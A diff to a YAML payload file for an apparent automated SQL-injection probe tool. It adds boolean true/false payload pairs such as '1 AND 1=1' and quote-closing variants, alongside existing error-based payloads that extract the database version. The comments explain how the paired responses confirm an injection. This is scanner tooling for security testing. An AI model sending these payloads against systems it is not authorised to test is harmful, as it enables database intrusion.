@@ -76,6 +76,23 @@ payloads:
     - "x', (SELECT error(version())) as v, '-- -"
     - "1', (SELECT error(version())) as v, '"
 
+# Boolean-differential confirmation pairs (sqli_probe DEFAULT probe, technique="boolean"). Each
+# pair's true_payload/false_payload members are SYNTACTICALLY IDENTICAL except for the boolean
+# truth value, so a STABLE response differential (HTTP status or body length) between them can
+# only come from the DB evaluating the condition — that is the injection signal. Read-only: these
+# only COMPARE a value, never write. The tool runs these ONLY when both error-based and time-based
+# miss, confirms with a two-sided + reproduce-twice guard, and reports CONFIRMED with the
+# differential as evidence. Top-level (not under payloads:) because each entry is a pair of
+# strings, read via get_value("sqli", "boolean_pairs"). Covers the common contexts: numeric,
+# single-quote string, and quote-closing numeric. Dialect-agnostic.
+boolean_pairs:
+  - true_payload: "1 AND 1=1"
+    false_payload: "1 AND 1=2"
+  - true_payload: "' AND '1'='1"
+    false_payload: "' AND '1'='2"
+  - true_payload: "1' AND '1'='1"
+    false_payload: "1' AND '1'='2"
+
 # Detection signatures (used by agent to classify responses)
 error_signatures:
   - "you have an error in your sql syntax"
